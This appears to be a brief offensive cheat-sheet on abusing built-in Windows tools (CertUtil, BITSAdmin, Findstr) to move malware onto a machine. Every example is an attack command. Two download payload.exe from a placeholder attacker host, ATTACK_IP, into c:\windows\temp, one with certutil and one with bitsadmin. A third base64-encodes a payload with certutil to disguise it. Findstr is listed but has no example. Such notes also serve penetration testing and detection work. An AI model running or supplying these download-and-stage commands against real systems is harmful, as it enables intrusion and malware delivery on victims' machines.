### Tools: CertUtil, BITSAdmin, Findstr

### Examples:

## CERTUTIL

#### 1) certutil -URLcache -split -f http://ATTACK_IP/payload.exe c:\windows\temp\payload.exe

#### 2) certutil -encode payload.exe Encoded-payload.txt

## BITSADMIN

#### 1)bitsadmin.exe /transfer /Download /priority Foreground http://ATTACK_IP/payload.exe c:\windows\temp\payload.exe
